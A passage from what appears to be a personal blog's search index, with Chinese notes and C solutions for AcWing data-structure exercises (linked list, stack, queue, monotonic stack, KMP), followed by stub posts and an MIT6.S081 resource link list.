class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   e[N]为元素值</span></span><br><span class="line"><span class="comment">   f[N]为前向指针数组，值为前一元素的索引，b[N]为后向指针，指向后一元素索引</span></span><br><span class="line"><span class="comment">   假定恒为头节点索引为0，尾节点索引恒为1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> e[N], f[N], b[N];</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 尾节点无后向</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 头节点无前向</span></span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">front_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    f[idx] = f[k];</span><br><span class="line">    b[idx] = k;</span><br><span class="line">    b[f[k]] = idx;</span><br><span class="line">    f[k] = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k右侧插入，等价于在b[k]的左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">back_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(b[k], x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点之后，等价于在头节点右侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">head_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    back_insert(<span class="number">0</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入尾节点之前，等价于在为节点做出插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tail_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(<span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    b[f[k]] = b[k];</span><br><span class="line">    f[b[k]] = f[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing 827双链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> e[N], f[N], b[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 尾节点无后向</span></span><br><span class="line">    b[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    f[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 头节点无前向</span></span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">front_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    f[idx] = f[k];</span><br><span class="line">    b[idx] = k;</span><br><span class="line">    b[f[k]] = idx;</span><br><span class="line">    f[k] = idx;</span><br><span class="line">    idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在k右侧插入，等价于在b[k]的左侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">back_insert</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(b[k], x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入头节点之后，等价于在头节点右侧插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">head_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    back_insert(<span class="number">0</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插入尾节点之前，等价于在为节点做出插入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">tail_insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    front_insert(<span class="number">1</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">int</span> k)</span>&#123;</span><br><span class="line">    b[f[k]] = b[k];</span><br><span class="line">    f[b[k]] = f[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> x, k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;= n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">        gets(a);</span><br><span class="line">        <span class="keyword">switch</span>(a[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">               x = atoi(a + <span class="number">2</span>);</span><br><span class="line">               head_insert(x);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">                x = atoi(a + <span class="number">2</span>);</span><br><span class="line">                tail_insert(x);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                k = atoi(a + <span class="number">2</span>);</span><br><span class="line">                delete_node(k + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                </span><br><span class="line">                k = atoi(a + <span class="number">3</span>);</span><br><span class="line">                <span class="type">int</span> i = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">while</span>(a[i]!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">                x = atoi(a + i + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(a[<span class="number">1</span>] == <span class="string">&#x27;L&#x27;</span>) front_insert(k+<span class="number">1</span>, x);</span><br><span class="line">                <span class="keyword">else</span> back_insert(k+<span class="number">1</span>, x);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = b[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span>(i != <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, e[i]);</span><br><span class="line">        i = b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、栈">三、栈</h2><p>特点：先进后出<br>数组实现栈，此处栈开的足够大，不考虑溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    top++;</span><br><span class="line">    <span class="built_in">stack</span>[top] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Acwing 828模拟栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    top++;</span><br><span class="line">    <span class="built_in">stack</span>[top] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[top];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">15</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;push&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;pop&quot;</span>))&#123;</span><br><span class="line">            pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;empty&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (!empty()) <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, query());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、队列">四、队列</h2><p>特点：先进后出<br>操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> q[N], head = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    tail++;</span><br><span class="line">    q[tail] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    head++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q[head];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>acwing 829模拟队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> q[N], head = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    tail++;</span><br><span class="line">    q[tail] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    head++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q[head];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;=n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;push&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, x);</span></span><br><span class="line">            push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;pop&quot;</span>))&#123;</span><br><span class="line">            pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;empty&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, query());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五、单调栈">五、单调栈</h2><p>acwing 830单调栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">        <span class="keyword">while</span>(top &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">stack</span>[top] &gt;= e) top--;</span><br><span class="line">        <span class="keyword">if</span>(top &lt;= <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, <span class="built_in">stack</span>[top]);</span><br><span class="line">        top++;</span><br><span class="line">        <span class="built_in">stack</span>[top] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、单调队列">六、单调队列</h2><h2 id="七、KMP">七、KMP</h2><p>acwing 831 KMP字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 1000010</span></span><br><span class="line"><span class="type">char</span> p[N], s[M];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(p[i] == p[j + <span class="number">1</span>]) j++;</span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(s[i] == p[j + <span class="number">1</span>]) j++;</span><br><span class="line">        <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">            j = ne[j];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i - n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_1</title>
      <link href="/2022/10/flask-1/"/>
      <url>/2022/10/flask-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django_1</title>
      <link href="/2022/10/django-1/"/>
      <url>/2022/10/django-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.824_1</title>
      <link href="/2022/10/MIT6-824-1/"/>
      <url>/2022/10/MIT6-824-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.S081（零）——资源汇总及注意事项</title>
      <link href="/2022/10/MIT6-S081-1/"/>
      <url>/2022/10/MIT6-S081-1/</url>
      
        <content type="html"><![CDATA[<p>包含了资源汇总和一些值得阅读的指北</p><h2 id="资源汇总">资源汇总</h2><h3 id="主要资源">主要资源</h3><ul><li><a href="https://pdos.csail.mit.edu/6.828/2021/schedule.html">课程网站</a></li><li><a href="https://www.youtube.com/watch?v=L6YqHxYHa7A">课程视频油管版</a></li><li><a href="https://pdos.csail.mit.edu/6.828/2021/xv6/book-riscv-rev2.pdf">课程教材2021版</a></li><li><a href="https://github.com/mit-pdos/xv6-riscv">xv6源代码</a></li><li><a href="https://pdos.csail.mit.edu/6.828/2021/xv6/book-riscv-rev2.pdf">xv6文档</a></li></ul><h3 id="中文翻译资源">中文翻译资源</h3><ul><li>课程视频翻译：<a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081/">https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081/</a> (推荐)</li><li>早期xv6文档翻译(x86-64版)，缺点是太老了，学习MIT 6.828可以使用:  <a href="https://github.com/ranxian/xv6-chinese">源代码传送门</a> 和 <a href="https://th0ar.gitbooks.io/xv6-chinese/content/">gitbook传送门</a></li><li>新版，但机翻比较严重：<a href="https://blog.betteryuan.top/archives/xv6-riscv-book-zh-cn">https://blog.betteryuan.top/archives/xv6-riscv-book-zh-cn</a></li><li>RISC-V版，翻译有点小问题，建议对照issue查看：<a href="https://github.com/zhenyu-zang/xv6-riscv-book-Chinese">https://github.com/zhenyu-zang/xv6-riscv-book-Chinese</a> (推荐)</li><li>文档+实验, all in one: <a href="http://xv6.dgs.zone/">http://xv6.dgs.zone/</a> (推荐)</li></ul><h3 id="部分可供参考的资源">部分可供参考的资源</h3><ul><li>xv6book阅读：<a href="https://www.cnblogs.com/dreamer-q/p/17816963.html">https://www.cnblogs.com/dreamer-q/p/17816963.html</a></li><li>资源汇总: <a href="https://tarplkpqsm.feishu.cn/docs/doccnBFsXFMsAr1oXEVsaT9E3Jg">https://tarplkpqsm.feishu.cn/docs/doccnBFsXFMsAr1oXEVsaT9E3Jg</a> (推荐)</li><li>视频讲解: <a href="https://space.bilibili.com/1040264970/">https://space.bilibili.com/1040264970/</a> (还没看www)</li><li>老教授版讲解: <a 